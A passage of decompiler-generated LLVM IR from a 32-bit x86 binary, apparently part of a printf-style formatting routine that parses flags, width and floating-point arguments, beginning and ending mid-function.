  %v0_8051411 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051411 = add i32 %v0_80513f7, -12
  %v3_8051411 = inttoptr i32 %v2_8051411 to i32*
  store i32 %v0_8051411, i32* %v3_8051411, align 4
  %v0_8051412 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051412 = add i32 %v0_80513f7, -16
  %v3_8051412 = inttoptr i32 %v2_8051412 to i32*
  store i32 %v0_8051412, i32* %v3_8051412, align 4
  %v0_8051413 = call i32 @function_8054934()
  %v0_8051418 = load i32, i32* @ebx, align 4
  %v1_8051418 = load i32, i32* @esp, align 4
  %v2_8051418 = inttoptr i32 %v1_8051418 to i32*
  store i32 %v0_8051418, i32* %v2_8051418, align 4
  %v0_805141b = load i32, i32* @esi, align 4
  %v1_805141b = load i32, i32* @esp, align 4
  %v2_805141b = add i32 %v1_805141b, -4
  %v3_805141b = inttoptr i32 %v2_805141b to i32*
  store i32 %v0_805141b, i32* %v3_805141b, align 4
  %v0_805141c = load i32, i32* @edx, align 4
  %v2_805141c = add i32 %v1_805141b, -8
  %v3_805141c = inttoptr i32 %v2_805141c to i32*
  store i32 %v0_805141c, i32* %v3_805141c, align 4
  %v2_805141d = add i32 %v1_805141b, -12
  %v3_805141d = inttoptr i32 %v2_805141d to i32*
  store i32 %v0_8051413, i32* %v3_805141d, align 4
  %v1_805141e = add i32 %v1_805141b, 347
  store i32 %v1_805141e, i32* %eax.global-to-local, align 4
  %v2_8051425 = add i32 %v1_805141b, -16
  %v3_8051425 = inttoptr i32 %v2_8051425 to i32*
  store i32 %v1_805141e, i32* %v3_8051425, align 4
  %v0_8051426 = load i32, i32* %stack_var_-364, align 4
  %v5_8051426 = inttoptr i32 %v0_8051426 to i8*
  %v6_8051426 = call i32 @function_80549cc(i8* %v5_8051426, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8051426, i32* %eax.global-to-local, align 4
  %v0_805142b = load i32, i32* @esp, align 4
  %v1_805142b = add i32 %v0_805142b, 32
  %v1_805142e = add i32 %v0_805142b, 80
  %v2_805142e = inttoptr i32 %v1_805142e to i32*
  %v3_805142e = load i32, i32* %v2_805142e, align 4
  %v4_805142e = add i32 %v3_805142e, -5
  %v8_805142e = icmp ult i32 %v3_805142e, 5
  %v12_805142e = icmp eq i32 %v4_805142e, 0
  %v13_805142e = icmp slt i32 %v4_805142e, 0
  store i1 %v13_805142e, i1* %sf.global-to-local, align 1
  store i32 %v6_8051426, i32* @edi, align 4
  %v2_8051435 = or i1 %v8_805142e, %v12_805142e
  br i1 %v2_8051435, label %dec_label_pc_805145f, label %dec_label_pc_8051437

dec_label_pc_8051437:                             ; preds = %dec_label_pc_805140f
  %v7_8051426 = inttoptr i32 %v6_8051426 to i8*
  %v3_8051437 = load i8, i8* %v7_8051426, align 1
  %v4_8051437 = add i8 %v3_8051437, -45
  %v12_8051437 = icmp eq i8 %v4_8051437, 0
  %v13_8051437 = icmp slt i8 %v4_8051437, 0
  store i1 %v13_8051437, i1* %sf.global-to-local, align 1
  %v1_805143a = icmp eq i1 %v12_8051437, false
  %v1_8051449 = add i32 %v0_805142b, 64
  %v2_8051449 = inttoptr i32 %v1_8051449 to i32*
  %v3_8051449 = load i32, i32* %v2_8051449, align 4
  br i1 %v1_805143a, label %dec_label_pc_8051449, label %dec_label_pc_805143c

dec_label_pc_805143c:                             ; preds = %dec_label_pc_8051437
  %v4_805143c = or i32 %v3_8051449, 2
  store i32 %v4_805143c, i32* %v2_8051449, align 4
  %v0_8051441 = load i32, i32* @edi, align 4
  %v1_8051441 = add i32 %v0_8051441, 1
  %v9_8051441 = icmp slt i32 %v1_8051441, 0
  store i1 %v9_8051441, i1* %sf.global-to-local, align 1
  store i32 %v1_8051441, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_805145f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805145f

dec_label_pc_8051449:                             ; preds = %dec_label_pc_8051437
  store i32 %v3_8051449, i32* %eax.global-to-local, align 4
  %v2_805144d = and i32 %v3_8051449, 2
  %v3_805144d = icmp eq i32 %v2_805144d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_805144d, label %dec_label_pc_8051455, label %dec_label_pc_8051451

dec_label_pc_8051451:                             ; preds = %dec_label_pc_8051449
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805145f

dec_label_pc_8051455:                             ; preds = %dec_label_pc_8051449
  %v2_8051455 = urem i32 %v3_8051449, 2
  %v3_8051455 = icmp eq i32 %v2_8051455, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_805145c = icmp eq i1 %v3_8051455, false
  %v2_805145c = load i32, i32* @ebp, align 4
  %v4_805145c = select i1 %v1_805145c, i32 4, i32 %v2_805145c
  store i32 %v4_805145c, i32* @ebp, align 4
  br label %dec_label_pc_805145f

dec_label_pc_805145f:                             ; preds = %dec_label_pc_805140f, %dec_label_pc_8051451, %dec_label_pc_805143c, %dec_label_pc_8051455
  %v0_80514b1 = phi i32 [ %v6_8051426, %dec_label_pc_805140f ], [ %v6_8051426, %dec_label_pc_8051451 ], [ %v1_8051441, %dec_label_pc_805143c ], [ %v6_8051426, %dec_label_pc_8051455 ]
  %v0_80514c1 = phi i32 [ %v1_805142b, %dec_label_pc_805140f ], [ %v1_805142b, %dec_label_pc_8051451 ], [ %v0_805145f.pre, %dec_label_pc_805143c ], [ %v1_805142b, %dec_label_pc_8051455 ]
  %v1_805145f = add i32 %v0_80514c1, 20
  %v2_805145f = inttoptr i32 %v1_805145f to i32*
  %v3_805145f = load i32, i32* %v2_805145f, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_8051463 = sub i32 204, %v0_80514b1
  %v2_805146f = add i32 %v1_8051463, %v0_80514c1
  %v1_8051471 = add i32 %v2_805146f, 127
  store i32 %v1_8051471, i32* @esi, align 4
  %v2_8051474 = icmp slt i32 %v3_805145f, 0
  store i1 %v2_8051474, i1* %sf.global-to-local, align 1
  %v3_8051476 = select i1 %v2_8051474, i32 1, i32 %v3_805145f
  store i32 %v3_8051476, i32* %ecx.global-to-local, align 4
  %v1_8051479 = add i32 %v0_80514c1, 32
  %v2_8051479 = inttoptr i32 %v1_8051479 to i8*
  %v3_8051479 = load i8, i8* %v2_8051479, align 1
  %v4_8051479 = and i8 %v3_8051479, 16
  %v5_8051479 = icmp eq i8 %v4_8051479, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_8051479, label %dec_label_pc_80514b1, label %dec_label_pc_8051480

dec_label_pc_8051480:                             ; preds = %dec_label_pc_805145f
  %v1_8051480 = add i32 %v0_80514c1, 48
  %v2_8051480 = inttoptr i32 %v1_8051480 to i32*
  %v3_8051480 = load i32, i32* %v2_8051480, align 4
  store i32 %v3_8051480, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i32 %v3_8051480, 3
  %v3_8051489 = load i32, i32* @ebp, align 4
  %v5_8051489 = select i1 %tmp68, i32 6, i32 %v3_8051489
  store i32 %v5_8051489, i32* @ebp, align 4
  %v1_805148c = add i32 %v3_8051480, -3
  %v9_805148c = icmp eq i32 %v1_805148c, 0
  %v10_805148c = icmp slt i32 %v1_805148c, 0
  store i1 %v10_805148c, i1* %sf.global-to-local, align 1
  %v1_805148f = icmp eq i1 %v9_805148c, false
  br i1 %v1_805148f, label %dec_label_pc_8051498, label %dec_label_pc_8051491

dec_label_pc_8051491:                             ; preds = %dec_label_pc_8051480
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_80514b1

dec_label_pc_8051498:                             ; preds = %dec_label_pc_8051480
  %v1_8051498 = add i32 %v3_8051480, -4
  %v9_8051498 = icmp eq i32 %v1_8051498, 0
  %v10_8051498 = icmp slt i32 %v1_8051498, 0
  store i1 %v10_8051498, i1* %sf.global-to-local, align 1
  %v1_805149b = icmp eq i1 %v9_8051498, false
  br i1 %v1_805149b, label %dec_label_pc_80514b1, label %dec_label_pc_805149d

dec_label_pc_805149d:                             ; preds = %dec_label_pc_8051498
  %v2_805149d = sub i32 %v3_8051476, %v1_8051471
  %v7_805149d = icmp ult i32 %v3_8051476, %v1_8051471
  %v12_805149d = icmp eq i32 %v2_805149d, 0
  %v13_805149d = icmp slt i32 %v2_805149d, 0
  store i1 %v13_805149d, i1* %sf.global-to-local, align 1
  %v2_805149f = or i1 %v7_805149d, %v12_805149d
  br i1 %v2_805149f, label %dec_label_pc_80514a1, label %dec_label_pc_80514b1

dec_label_pc_80514a1:                             ; preds = %dec_label_pc_805149d
  %v1_80514a1 = inttoptr i32 %v0_80514b1 to i8*
  %v2_80514a1 = load i8, i8* %v1_80514a1, align 1
  %v3_80514a1 = add i8 %v2_80514a1, -48
  %v8_80514a1 = icmp eq i8 %v3_80514a1, 0
  %v9_80514a1 = icmp slt i8 %v3_80514a1, 0
  store i1 %v9_80514a1, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_80514a1, label %dec_label_pc_80514b1, label %dec_label_pc_80514ab

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_80514a1
  %v1_80514ab = add i32 %v2_805146f, 128
  store i32 %v1_80514ab, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80514b1

dec_label_pc_80514b1:                             ; preds = %dec_label_pc_805149d, %dec_label_pc_80514a1, %dec_label_pc_8051498, %dec_label_pc_805145f, %dec_label_pc_8051491, %dec_label_pc_80514ab
  %v0_80514ea = phi i32 [ %v3_8051476, %dec_label_pc_805149d ], [ 1, %dec_label_pc_80514a1 ], [ %v3_8051476, %dec_label_pc_8051498 ], [ %v3_8051476, %dec_label_pc_805145f ], [ %v3_8051476, %dec_label_pc_8051491 ], [ %v1_80514ab, %dec_label_pc_80514ab ]
  %v1_80514b1 = inttoptr i32 %v0_80514b1 to i8*
  %v2_80514b1 = load i8, i8* %v1_80514b1, align 1
  %v3_80514b1 = add i8 %v2_80514b1, -48
  %v8_80514b1 = icmp eq i8 %v3_80514b1, 0
  %v9_80514b1 = icmp slt i8 %v3_80514b1, 0
  store i1 %v9_80514b1, i1* %sf.global-to-local, align 1
  %v1_80514b4 = icmp eq i1 %v8_80514b1, false
  br i1 %v1_80514b4, label %dec_label_pc_80514e2, label %dec_label_pc_80514b6

dec_label_pc_80514b6:                             ; preds = %dec_label_pc_80514b1
  %v0_80514b6 = load i32, i32* @ebp, align 4
  %v1_80514b6 = add i32 %v0_80514b6, -6
  %v6_80514b6 = sub i32 5, %v0_80514b6
  %v7_80514b6 = and i32 %v6_80514b6, %v0_80514b6
  %v8_80514b6 = icmp slt i32 %v7_80514b6, 0
  %v10_80514b6 = icmp slt i32 %v1_80514b6, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_80514be = icmp eq i1 %v10_80514b6, %v8_80514b6
  %v5_80514be = select i1 %v2_80514be, i32 11, i32 %v0_80514b6
  store i32 %v5_80514be, i32* @ebp, align 4
  %v1_80514c1 = add i32 %v0_80514c1, 48
  %v2_80514c1 = inttoptr i32 %v1_80514c1 to i32*
  %v3_80514c1 = load i32, i32* %v2_80514c1, align 4
  %v4_80514c1 = add i32 %v3_80514c1, -1
  %v12_80514c1 = icmp eq i32 %v4_80514c1, 0
  %v13_80514c1 = icmp slt i32 %v4_80514c1, 0
  store i1 %v13_80514c1, i1* %sf.global-to-local, align 1
  %v1_80514c6 = icmp eq i1 %v12_80514c1, false
  br i1 %v1_80514c6, label %dec_label_pc_80514d7, label %dec_label_pc_80514c8

dec_label_pc_80514c8:                             ; preds = %dec_label_pc_80514b6
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805c098.310 to i32), i32* @edi, align 4
  br label %dec_label_pc_8051661

dec_label_pc_80514d7:                             ; preds = %dec_label_pc_80514b6
  %v1_80514d7 = icmp eq i32 %v0_80514ea, 0
  %v2_80514d7 = icmp slt i32 %v0_80514ea, 0
  store i1 %v2_80514d7, i1* %sf.global-to-local, align 1
  %v1_80514d9 = icmp eq i1 %v1_80514d7, false
  br i1 %v1_80514d9, label %dec_label_pc_80514e2, label %dec_label_pc_80514db

dec_label_pc_80514db:                             ; preds = %dec_label_pc_80514d7
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8051661

dec_label_pc_80514e2:                             ; preds = %dec_label_pc_80514d7, %dec_label_pc_80514b1
  %v2_80514e2 = sub i32 %v0_80514ea, %v1_8051471
  %v7_80514e2 = icmp ult i32 %v0_80514ea, %v1_8051471
  %v12_80514e2 = icmp eq i32 %v2_80514e2, 0
  %v13_80514e2 = icmp slt i32 %v2_80514e2, 0
  store i1 %v13_80514e2, i1* %sf.global-to-local, align 1
  %v2_80514e4 = or i1 %v7_80514e2, %v12_80514e2
  br i1 %v2_80514e4, label %dec_label_pc_8051661, label %dec_label_pc_80514ea

dec_label_pc_80514ea:                             ; preds = %dec_label_pc_80514e2
  store i1 %v13_80514e2, i1* %sf.global-to-local, align 1
  store i32 %v2_80514e2, i32* @ebx, align 4
  br label %dec_label_pc_805167b

dec_label_pc_80514f3:                             ; preds = %dec_label_pc_8051386
  %v1_80514f3 = add i32 %v3_8051358, -15
  %v5_80514f3 = icmp ult i32 %v3_8051358, 15
  %v9_80514f3 = icmp eq i32 %v1_80514f3, 0
  %v10_80514f3 = icmp slt i32 %v1_80514f3, 0
  store i1 %v10_80514f3, i1* %sf.global-to-local, align 1
  %v2_80514f6 = or i1 %v5_80514f3, %v9_80514f3
  br i1 %v2_80514f6, label %dec_label_pc_80514f8, label %dec_label_pc_805153d

dec_label_pc_80514f8:                             ; preds = %dec_label_pc_80514f3
  %v1_80514f8 = add i32 %v0_8051358.lcssa, 33
  %v2_80514f8 = inttoptr i32 %v1_80514f8 to i8*
  %v3_80514f8 = load i8, i8* %v2_80514f8, align 1
  %v4_80514f8 = and i8 %v3_80514f8, 8
  %v5_80514f8 = icmp eq i8 %v4_80514f8, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80514fd = add i32 %v0_8051358.lcssa, 344
  %v2_80514fd = inttoptr i32 %v1_80514fd to i32*
  %v3_80514fd = load i32, i32* %v2_80514fd, align 4
  store i32 %v3_80514fd, i32* %edx.global-to-local, align 4
  br i1 %v5_80514f8, label %dec_label_pc_805150a, label %dec_label_pc_8051506

dec_label_pc_8051506:                             ; preds = %dec_label_pc_80514f8
  %v1_8051506 = inttoptr i32 %v3_80514fd to x86_fp80*
  %v2_8051506 = load x86_fp80, x86_fp80* %v1_8051506, align 4
  br label %dec_label_pc_805150c

dec_label_pc_805150a:                             ; preds = %dec_label_pc_80514f8
  %v1_805150a = inttoptr i32 %v3_80514fd to double*
  %v2_805150a = load double, double* %v1_805150a, align 4
  %v3_805150a = fpext double %v2_805150a to x86_fp80
  br label %dec_label_pc_805150c

dec_label_pc_805150c:                             ; preds = %dec_label_pc_8051506, %dec_label_pc_805150a
  %storemerge4 = phi x86_fp80 [ %v2_8051506, %dec_label_pc_8051506 ], [ %v3_805150a, %dec_label_pc_805150a ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_805150c = load i32, i32* @esi, align 4
  %v2_805150c = add i32 %v0_8051358.lcssa, -4
  %v3_805150c = inttoptr i32 %v2_805150c to i32*
  store i32 %v0_805150c, i32* %v3_805150c, align 4
  %v0_805150d = load i32, i32* @esi, align 4
  %v2_805150d = add i32 %v0_8051358.lcssa, -8
  %v3_805150d = inttoptr i32 %v2_805150d to i32*
  store i32 %v0_805150d, i32* %v3_805150d, align 4
  %v1_805150e = add i32 %v0_8051358.lcssa, -12
  %v2_805150e = inttoptr i32 %v1_805150e to i32*
  store i32 134549966, i32* %v2_805150e, align 4
  %v1_8051513 = add i32 %v0_8051358.lcssa, 20
  store i32 %v1_8051513, i32* %eax.global-to-local, align 4
  %v2_8051517 = add i32 %v0_8051358.lcssa, -16
  %v3_8051517 = inttoptr i32 %v2_8051517 to i32*
  store i32 %v1_8051513, i32* %v3_8051517, align 4
  %v1_8051518 = add i32 %v0_8051358.lcssa, -28
  %v10_8051518 = icmp slt i32 %v1_8051518, 0
  store i1 %v10_8051518, i1* %sf.global-to-local, align 1
  %v1_805151b = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_805151b = inttoptr i32 %v1_8051518 to x86_fp80*
  store x86_fp80 %v1_805151b, x86_fp80* %v3_805151b, align 4
  %v1_805151e = add i32 %v0_8051358.lcssa, 368
  %v2_805151e = inttoptr i32 %v1_805151e to i32*
  %v3_805151e = load i32, i32* %v2_805151e, align 4
  %v5_805151e = add i32 %v0_8051358.lcssa, -32
  %v6_805151e = inttoptr i32 %v5_805151e to i32*
  store i32 %v3_805151e, i32* %v6_805151e, align 4
  %v0_8051525 = call i32 @function_8054a9c()
  store i32 %v0_8051525, i32* %eax.global-to-local, align 4
  %v0_805152a = load i32, i32* @esp, align 4
  %v1_805152a = add i32 %v0_805152a, 32
  %v2_805152d = icmp slt i32 %v0_8051525, 0
  store i1 %v2_805152d, i1* %sf.global-to-local, align 1
  br i1 %v2_805152d, label %dec_label_pc_80517db, label %dec_label_pc_8051535

dec_label_pc_8051535:                             ; preds = %dec_label_pc_805150c
  %v1_8051535 = inttoptr i32 %v1_805152a to i32*
  %v2_8051535 = load i32, i32* %v1_8051535, align 4
  %v4_8051535 = add i32 %v2_8051535, %v0_8051525
  %v15_8051535 = icmp slt i32 %v4_8051535, 0
  store i1 %v15_8051535, i1* %sf.global-to-local, align 1
  store i32 %v4_8051535, i32* %v1_8051535, align 4
  %v0_80517c8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80517c8

dec_label_pc_805153d:                             ; preds = %dec_label_pc_80514f3
  %v1_805153d = add i32 %v3_8051358, -17
  %v5_805153d = icmp ult i32 %v3_8051358, 17
  %v9_805153d = icmp eq i32 %v1_805153d, 0
  %v10_805153d = icmp slt i32 %v1_805153d, 0
  store i1 %v10_805153d, i1* %sf.global-to-local, align 1
  %v2_8051540 = or i1 %v5_805153d, %v9_805153d
  br i1 %v2_8051540, label %dec_label_pc_8051546, label %dec_label_pc_80515da

dec_label_pc_8051546:                             ; preds = %dec_label_pc_805153d
  %v1_8051546 = add i32 %v0_8051358.lcssa, 332
  %v2_8051546 = inttoptr i32 %v1_8051546 to i32*
  store i32 0, i32* %v2_8051546, align 4
  %v0_8051551 = load i32, i32* @esp, align 4
  %v1_8051551 = add i32 %v0_8051551, 344
  %v2_8051551 = inttoptr i32 %v1_8051551 to i32*
  %v3_8051551 = load i32, i32* %v2_8051551, align 4
  store i32 %v3_8051551, i32* %edx.global-to-local, align 4
  %v1_8051558 = icmp eq i1 %v9_805153d, false
  br i1 %v1_8051558, label %dec_label_pc_80515aa, label %dec_label_pc_805155a

dec_label_pc_805155a:                             ; preds = %dec_label_pc_8051546
  %v1_805155a = inttoptr i32 %v3_8051551 to i32*
  %v2_805155a = load i32, i32* %v1_805155a, align 4
  store i32 %v2_805155a, i32* %eax.global-to-local, align 4
  %v1_805155c = icmp eq i32 %v2_805155a, 0
  %v2_805155c = icmp slt i32 %v2_805155a, 0
  store i1 %v2_805155c, i1* %sf.global-to-local, align 1
  %v2_805155e = add i32 %v0_8051551, 340
  %v3_805155e = inttoptr i32 %v2_805155e to i32*
  store i32 %v2_805155a, i32* %v3_805155e, align 4
  br i1 %v1_805155c, label %dec_label_pc_8051665, label %dec_label_pc_805156b

dec_label_pc_805156b:                             ; preds = %dec_label_pc_805155a
  %v0_805156b = load i32, i32* @esp, align 4
  %v1_805156b = add i32 %v0_805156b, 20
  %v2_805156b = inttoptr i32 %v1_805156b to i32*
  %v3_805156b = load i32, i32* %v2_805156b, align 4
  %v1_8051572 = add i32 %v0_805156b, 340
  store i32 %v1_8051572, i32* %ecx.global-to-local, align 4
  %v2_8051579 = icmp slt i32 %v3_805156b, 0
  store i1 %v2_8051579, i1* %sf.global-to-local, align 1
  %v1_805157b = icmp eq i1 %v2_8051579, false
  %v4_805157b = select i1 %v1_805157b, i32 %v3_805156b, i32 -1
  store i32 %v4_805157b, i32* %edx.global-to-local, align 4
  %v1_805157e = add i32 %v0_805156b, 332
  store i32 %v1_805157e, i32* %eax.global-to-local, align 4
  %v2_8051585 = add i32 %v0_805156b, -4
  %v3_8051585 = inttoptr i32 %v2_8051585 to i32*
  store i32 %v1_805157e, i32* %v3_8051585, align 4
  %v0_8051586 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051586 = add i32 %v0_805156b, -8
  %v3_8051586 = inttoptr i32 %v2_8051586 to i32*
  store i32 %v0_8051586, i32* %v3_8051586, align 4
  %v0_8051587 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051587 = add i32 %v0_805156b, -12
  %v3_8051587 = inttoptr i32 %v2_8051587 to i32*
  store i32 %v0_8051587, i32* %v3_8051587, align 4
  %v0_8051588 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8051588 = add i32 %v0_805156b, -16
  %v3_8051588 = inttoptr i32 %v2_8051588 to i32*
  store i32 %v0_8051588, i32* %v3_8051588, align 4
  %v0_8051589 = call i32 @function_8054658()
  store i32 %v0_8051589, i32* %eax.global-to-local, align 4
  %v0_805158e = load i32, i32* @esp, align 4
  %v1_805158e = add i32 %v0_805158e, 16
  %v1_8051591 = add i32 %v0_8051589, 1
  %v10_8051591 = icmp eq i32 %v1_8051591, 0
  %v11_8051591 = icmp slt i32 %v1_8051591, 0
  store i1 %v11_8051591, i1* %sf.global-to-local, align 1
  store i32 %v0_8051589, i32* @esi, align 4
  br i1 %v10_8051591, label %dec_label_pc_80517db, label %dec_label_pc_805159c

dec_label_pc_805159c:                             ; preds = %dec_label_pc_805156b
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8051676

dec_label_pc_80515aa:                             ; preds = %dec_label_pc_8051546
  %v0_80515aa = load i32, i32* @ebx, align 4
  %v2_80515aa = add i32 %v0_8051551, -4
  %v3_80515aa = inttoptr i32 %v2_80515aa to i32*
  store i32 %v0_80515aa, i32* %v3_80515aa, align 4
  %v1_80515ab = add i32 %v0_8051551, 332
  store i32 %v1_80515ab, i32* %eax.global-to-local, align 4
  %v2_80515b2 = add i32 %v0_8051551, -8
  %v3_80515b2 = inttoptr i32 %v2_80515b2 to i32*
  store i32 %v1_80515ab, i32* %v3_80515b2, align 4
  %v0_80515b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515b3 = inttoptr i32 %v0_80515b3 to i32*
  %v2_80515b3 = load i32, i32* %v1_80515b3, align 4
  %v4_80515b3 = add i32 %v0_8051551, -12
  %v5_80515b3 = inttoptr i32 %v4_80515b3 to i32*
  store i32 %v2_80515b3, i32* %v5_80515b3, align 4
  %v1_80515b5 = add i32 %v0_8051551, 204
  store i32 %v1_80515b5, i32* @edi, align 4
  %v2_80515bc = add i32 %v0_8051551, -16
  %v3_80515bc = inttoptr i32 %v2_80515bc to i32*
  store i32 %v1_80515b5, i32* %v3_80515bc, align 4
  %v0_80515bd = call i32 @function_8054610()
  store i32 %v0_80515bd, i32* %eax.global-to-local, align 4
  %v0_80515c2 = load i32, i32* @esp, align 4
  %v1_80515c2 = add i32 %v0_80515c2, 16
  %v1_80515c5 = add i32 %v0_80515bd, 1
  %v10_80515c5 = icmp eq i32 %v1_80515c5, 0
  %v11_80515c5 = icmp slt i32 %v1_80515c5, 0
  store i1 %v11_80515c5, i1* %sf.global-to-local, align 1
  store i32 %v0_80515bd, i32* @esi, align 4
  br i1 %v10_80515c5, label %dec_label_pc_80517db, label %dec_label_pc_80515d0

dec_label_pc_80515d0:                             ; preds = %dec_label_pc_80515aa
  %v2_80515d0 = add i32 %v0_80515bd, 220
  %v3_80515d0 = add i32 %v2_80515d0, %v0_80515c2
  %v4_80515d0 = inttoptr i32 %v3_80515d0 to i8*
  store i8 0, i8* %v4_80515d0, align 1
  br label %dec_label_pc_8051608

dec_label_pc_80515da:                             ; preds = %dec_label_pc_805153d
  %v1_80515da = add i32 %v3_8051358, -19
  %v5_80515da = icmp ult i32 %v3_8051358, 19
  %v9_80515da = icmp eq i32 %v1_80515da, 0
  %v10_80515da = icmp slt i32 %v1_80515da, 0
  store i1 %v10_80515da, i1* %sf.global-to-local, align 1
  %v2_80515dd = or i1 %v5_80515da, %v9_80515da
  br i1 %v2_80515dd, label %dec_label_pc_80515df, label %dec_label_pc_8051637

dec_label_pc_80515df:                             ; preds = %dec_label_pc_80515da
  %v1_80515df = add i32 %v0_8051358.lcssa, 344
  %v2_80515df = inttoptr i32 %v1_80515df to i32*
  %v3_80515df = load i32, i32* %v2_80515df, align 4
  store i32 %v3_80515df, i32* %edx.global-to-local, align 4
  %v1_80515e6 = icmp eq i1 %v9_80515da, false
  %v1_8051611 = inttoptr i32 %v3_80515df to i32*
  %v2_8051611 = load i32, i32* %v1_8051611, align 4
  br i1 %v1_80515e6, label %dec_label_pc_8051611, label %dec_label_pc_80515e8

dec_label_pc_80515e8:                             ; preds = %dec_label_pc_80515df
  store i32 %v2_8051611, i32* @edi, align 4
  %v1_80515ea = icmp eq i32 %v2_8051611, 0
  %v2_80515ea = icmp slt i32 %v2_8051611, 0
  store i1 %v2_80515ea, i1* %sf.global-to-local, align 1
  br i1 %v1_80515ea, label %dec_label_pc_8051665, label %dec_label_pc_80515ee

dec_label_pc_80515ee:                             ; preds = %dec_label_pc_80515e8, %dec_label_pc_8051640
  %v1_80515f5 = phi i32 [ %v0_8051358.lcssa, %dec_label_pc_80515e8 ], [ %v1_805165a, %dec_label_pc_8051640 ]
  %v1_80515ee = add i32 %v1_80515f5, 20
  %v2_80515ee = inttoptr i32 %v1_80515ee to i32*
  %v3_80515ee = load i32, i32* %v2_80515ee, align 4
  store i32 %v3_80515ee, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_80515f5 = add i32 %v1_80515f5, -4
  %v3_80515f5 = inttoptr i32 %v2_80515f5 to i32*
  store i32 %v3_8051358, i32* %v3_80515f5, align 4
  %v2_80515f6 = add i32 %v1_80515f5, -8
  %v3_80515f6 = inttoptr i32 %v2_80515f6 to i32*
  store i32 %v3_8051358, i32* %v3_80515f6, align 4
  %v2_80515f7 = icmp slt i32 %v3_80515ee, 0
  store i1 %v2_80515f7, i1* %sf.global-to-local, align 1
  %v1_80515f9 = icmp eq i1 %v2_80515f7, false
  %v2_80515f9 = load i32, i32* %eax.global-to-local, align 4
  %v4_80515f9 = select i1 %v1_80515f9, i32 %v3_80515ee, i32 %v2_80515f9
  store i32 %v4_80515f9, i32* %eax.global-to-local, align 4
  %v2_80515fc = add i32 %v1_80515f5, -12
  %v3_80515fc = inttoptr i32 %v2_80515fc to i32*
  store i32 %v4_80515f9, i32* %v3_80515fc, align 4
  %v0_80515fd = load i32, i32* @edi, align 4
  %v2_80515fd = add i32 %v1_80515f5, -16
  %v3_80515fd = inttoptr i32 %v2_80515fd to i32*
  store i32 %v0_80515fd, i32* %v3_80515fd, align 4
  %v0_80515fe = call i32 @function_8051f34()
  store i32 %v0_80515fe, i32* %eax.global-to-local, align 4
  %v0_8051603 = load i32, i32* @esp, align 4
  %v1_8051603 = add i32 %v0_8051603, 16
  %v7_8051603 = icmp slt i32 %v1_8051603, 0
  store i1 %v7_8051603, i1* %sf.global-to-local, align 1
  store i32 %v0_80515fe, i32* @esi, align 4
  br label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515d0, %dec_label_pc_80515ee
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8051676

dec_label_pc_8051611:                             ; preds = %dec_label_pc_80515df
  store i32 %v2_8051611, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_805161f = add i32 %v0_8051358.lcssa, 204
  store i32 %v1_805161f, i32* @edi, align 4
  %v1_8051626 = add i32 %v0_8051358.lcssa, 205
  %v2_8051626 = inttoptr i32 %v1_8051626 to i8*
  store i8 0, i8* %v2_8051626, align 1
  %v0_805162e = load i32, i32* %eax.global-to-local, align 4
  %v1_805162e = trunc i32 %v0_805162e to i8
  %v2_805162e = load i32, i32* @esp, align 4
  %v3_805162e = add i32 %v2_805162e, 204
  %v4_805162e = inttoptr i32 %v3_805162e to i8*
  store i8 %v1_805162e, i8* %v4_805162e, align 1
  br label %dec_label_pc_8051676

dec_label_pc_8051637:                             ; preds = %dec_label_pc_80515da
  %v1_8051637 = add i32 %v3_8051358, -20
  %v9_8051637 = icmp eq i32 %v1_8051637, 0
  %v10_8051637 = icmp slt i32 %v1_8051637, 0
  store i1 %v10_8051637, i1* %sf.global-to-local, align 1
  %v1_805163a = icmp eq i1 %v9_8051637, false
  br i1 %v1_805163a, label %dec_label_pc_80517db, label %dec_label_pc_8051640

dec_label_pc_8051640:                             ; preds = %dec_label_pc_8051637
  %v0_8051640 = load i32, i32* %stack_var_-364, align 4
  %v1_8051640 = call i32 @function_8050f90(i32 %v0_8051640)
  store i32 %v1_8051640, i32* %eax.global-to-local, align 4
  %v0_8051645 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051645 = load i32, i32* @esp, align 4
